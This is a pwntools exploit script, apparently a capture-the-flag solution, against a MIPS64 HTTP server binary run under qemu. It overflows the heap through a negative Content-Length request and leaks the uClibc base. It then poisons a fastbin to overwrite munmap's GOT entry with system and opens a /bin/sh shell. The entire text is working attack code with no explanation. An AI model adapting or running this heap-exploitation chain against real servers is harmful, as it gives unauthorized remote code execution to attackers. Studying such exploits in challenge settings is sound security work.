from pwn import *
import requests

p = process(["qemu-mips64","-L","./" ,"./httpd"])
#p = process(["qemu-mips64","-g", "1234", "-L","./" ,"./httpd"])
context.arch = "mips64"
context.endian = 'big' #big end
context.log_level = "debug"


def show(idx:int):
    print("[*] Try to show {}".format(idx))
    req = "GET /?Show={} HTTP/1.1\n\n".format(idx)
    p.send(req.encode())
    
def delete(idx:int):
    print("[*] Try to delete {}".format(idx))
    req = "GET /?Del={} HTTP/1.1\n\n".format(idx)
    p.send(req.encode())
    
def write(idx:int, size:int, content):
    print("[*] Try to write {}({}) into {}".format(content, size, idx))
    req = "POST / HTTP/1.1\n"
    req += "Content-Indexx: {}\n".format(idx)
    req += "Content-Length: {}\n\n".format(size)
    req = req.encode()
    req += content
    p.send(req)
    
def vuln(payload):
    req = "POST / HTTP/1.1\n"
    req += "Content-Length: -1" # go inside error_request()
    req = req.encode()
    req += payload + b"\n"
    p.send(req)
    
    
def exp():
    # leak uClibc base
    write(0, 0x20, b"A"*0x20) #keep fastbin
    write(1, 0x80, b"A"*0x80) #unsorted bin
    write(2, 0x10, b"A"*0x10) #split
    delete(1)
    write(3, 0x1, b"A"*0x1) #get part of unsorted chunk
    
    ## leak uClibc (for qemu-user there is a \x00 byte in the fd)
    vuln(b"A"*(0x208-2)+p64(0x31)+b"A"*0x28+p64(0x21)+b"|||||") 
    show(3)
    p.recvuntil(b"|||||")
    p.recvuntil(b"|||||")
    leak_bytes = b"\x40\x00" + p.recv(3)
    libc_leak = u64(leak_bytes.rjust(8, b"\x00")) # qemu-user only
    libc_base = libc_leak - 0x750a8 - 0x4ddb0
    munmap_got = libc_base + 0xA9228
    system = libc_base + 0x65370
    print("libc_leak:", hex(libc_leak))
    print("libc_base:", hex(libc_base))
    print("munmap_got:", hex(munmap_got))
    print("system:", hex(system))
    write(4, 0x60, b"B"*0x60) #clean unsortedbin
    
    ## build fake fastbin
    delete(0)
    vuln(b"A"*(0x208-2)+p64(0x31)+p64(munmap_got-0x10+5))
    write(5, 0x20, b"C"*0x20)
    write(6, 0x20, p64(system)[5:].ljust(0x20, b"\x00")) #get munmap_got (qemu-user only)
    
    
    ## getshell
    vuln(b"A"*(0x200-2) + p64(0xfffffffffffffff0) + p64(0x63) + b"/bin/sh\x00")
    delete(5)
    
    
    p.interactive()

if __name__ == "__main__":
    exp()
